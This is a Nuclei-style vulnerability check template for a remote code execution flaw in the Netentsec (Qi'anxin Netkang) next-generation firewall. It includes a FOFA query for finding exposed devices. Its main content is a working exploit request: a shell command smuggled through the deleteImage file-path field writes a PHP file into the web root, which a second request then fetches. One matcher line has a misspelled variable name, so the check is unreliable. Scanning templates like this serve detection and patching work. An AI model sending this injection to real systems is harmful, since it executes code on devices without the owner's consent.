id: netentsec-ngfw-deleteImage-rce

info:
  name: netentsec deleteImage.php 网康下一代防火墙 - rce
  author: pikpikcu,leadlife,afrog
  severity: critical
  description: Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.
  reference:
    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
    - https://github.com/zan8in/afrog/blob/81501b69981536dda20d76c2e889169bec9c02b3/pocs/afrog-pocs/vulnerability/netentsec-ngfw-rce.yaml
  metadata:
    verified: true
    fofa-query: title="网康下一代防火墙" && body="/images/dashboard/dashboard.png" || banner="Netentsec NGFW"
  tags: netentsec,rce,firewall,iot

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /directdata/direct/router HTTP/1.1
        Host: {{Hostname}}

        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5(1);unlink(__FILE__);?>' >/var/www/html/{{filename}}.php"]}],"type":"rpc","tid":17}
        
      - |
        GET /{{filename}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && stutas_code_2 == 200
          - contains(body_2,'c4ca4238a0b923820dcc50')
        condition: and

